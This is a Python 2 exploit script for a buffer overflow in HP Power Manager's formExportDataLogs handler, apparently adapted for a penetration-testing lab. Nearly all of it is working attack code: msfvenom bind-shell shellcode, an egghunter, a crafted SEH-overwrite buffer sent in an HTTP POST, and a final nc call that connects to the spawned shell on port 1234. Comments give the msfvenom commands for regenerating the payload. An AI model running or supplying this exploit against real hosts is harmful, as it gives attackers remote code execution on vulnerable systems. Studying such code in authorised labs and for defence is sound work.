#!/usr/bin/python
print """
##//#############################################################################################################
##							##							#
## Vulnerability: HP Power Manager 'formExportDataLogs' ##  FormExportDataLogs Buffer Overflow	 		#
## 							##  HP Power Manager				 	#
## Vulnerable Application: HP Power Manager	 	##  This is a part of the Metasploit Module, 		#
## Tested on Windows [Version 6.1.7600] 		##  exploit/windows/http/hp_power_manager_filename	#
##							##							#
## Author: Muhammad Haidari				##  Spawns a shell to same window			#
## Contact: ghmh@outlook.com				##							#
## Website: www.github.com/muhammd			##							#
##							##							#
##//#############################################################################################################
##
##
## TODO: adjust 
##
## Usage: python hpm_exploit.py <Remote IP Address>
"""
import urllib
import os
import sys
import struct
import time
from socket import *

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80

#msfvenom -p windows/shell_bind_tcp LHOST=10.11.0.55 LPORT=1234  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python

# R. Flemen - command used to modify shell code (change IP and port as needed):
# R. Flemen - "msfvenom -p windows/shell_bind_tcp LHOST=192.168.45.181 LPORT=1234 EXITFUNC=thread -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a' x86/alpha_mixed --platform windows -f python"

egg="b33fb33f"
buf= egg
buf += b"\x29\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\x93\x9f\xd2\xb0\x83\xee\xfc\xe2\xf4"
buf += b"\x6f\x77\x50\xb0\x93\x9f\xb2\x39\x76\xae\x12\xd4"
buf += b"\x18\xcf\xe2\x3b\xc1\x93\x59\xe2\x87\x14\xa0\x98"
buf += b"\x9c\x28\x98\x96\xa2\x60\x7e\x8c\xf2\xe3\xd0\x9c"
buf += b"\xb3\x5e\x1d\xbd\x92\x58\x30\x42\xc1\xc8\x59\xe2"
buf += b"\x83\x14\x98\x8c\x18\xd3\xc3\xc8\x70\xd7\xd3\x61"
buf += b"\xc2\x14\x8b\x90\x92\x4c\x59\xf9\x8b\x7c\xe8\xf9"
buf += b"\x18\xab\x59\xb1\x45\xae\x2d\x1c\x52\x50\xdf\xb1"
buf += b"\x54\xa7\x32\xc5\x65\x9c\xaf\x48\xa8\xe2\xf6\xc5"
buf += b"\x77\xc7\x59\xe8\xb7\x9e\x01\xd6\x18\x93\x99\x3b"
buf += b"\xcb\x83\xd3\x63\x18\x9b\x59\xb1\x43\x16\x96\x94"
buf += b"\xb7\xc4\x89\xd1\xca\xc5\x83\x4f\x73\xc0\x8d\xea"
buf += b"\x18\x8d\x39\x3d\xce\xf7\xe1\x82\x93\x9f\xba\xc7"
buf += b"\xe0\xad\x8d\xe4\xfb\xd3\xa5\x96\x94\x60\x07\x08"
buf += b"\x03\x9e\xd2\xb0\xba\x5b\x86\xe0\xfb\xb6\x52\xdb"
buf += b"\x93\x60\x07\xda\x9b\xc6\x82\x52\x6e\xdf\x82\xf0"
buf += b"\xc3\xf7\x38\xbf\x4c\x7f\x2d\x65\x04\xf7\xd0\xb0"
buf += b"\x97\x4d\x5b\x56\xf9\x8f\x84\xe7\xfb\x5d\x09\x87"
buf += b"\xf4\x60\x07\xe7\xfb\x28\x3b\x88\x6c\x60\x07\xe7"
buf += b"\xfb\xeb\x3e\x8b\x72\x60\x07\xe7\x04\xf7\xa7\xde"
buf += b"\xde\xfe\x2d\x65\xfb\xfc\xbf\xd4\x93\x16\x31\xe7"
buf += b"\xc4\xc8\xe3\x46\xf9\x8d\x8b\xe6\x71\x62\xb4\x77"
buf += b"\xd7\xbb\xee\xb1\x92\x12\x96\x94\x83\x59\xd2\xf4"
buf += b"\xc7\xcf\x84\xe6\xc5\xd9\x84\xfe\xc5\xc9\x81\xe6"
buf += b"\xfb\xe6\x1e\x8f\x15\x60\x07\x39\x73\xd1\x84\xf6"
buf += b"\x6c\xaf\xba\xb8\x14\x82\xb2\x4f\x46\x24\x32\xad"
buf += b"\xb9\x95\xba\x16\x06\x22\x4f\x4f\x46\xa3\xd4\xcc"
buf += b"\x99\x1f\x29\x50\xe6\x9a\x69\xf7\x80\xed\xbd\xda"
buf += b"\x93\xcc\x2d\x65"

#tools/exploit/egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e b33f -v 'hunter'

hunter =  ""
hunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
hunter += "\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x89\xd7"
hunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buffer = "\x41" * (721 -len(hunter))
buffer +="\x90"*30 + hunter
buffer +="\xeb\xc2\x90\x90"           #JMP SHORT 0xC2 
buffer += "\xd5\x74\x41" 	      #pop esi # pop ebx # ret 10 (DevManBE.exe)
 

content= "dataFormat=comma&exportto=file&fileName=%s" % urllib.quote_plus(buffer)
content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
payload += "Host: %s\r\n" % HOST
payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
payload += "Accept: %s\r\n" % buf
payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: %s\r\n\r\n" % len(content)
payload += content

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print "[+] Payload Fired... She will be back in less than a min..."
s.send(payload)
print "[+] Give me 30 Sec!"
time.sleep(30)
os.system("nc -nv " + HOST +" 1234")
s.close()
print "[+] Did you get your Proof.txt file?!?"
#note if you didn't get a bindshell, you may have to bump it to a minute time.sleep(60).
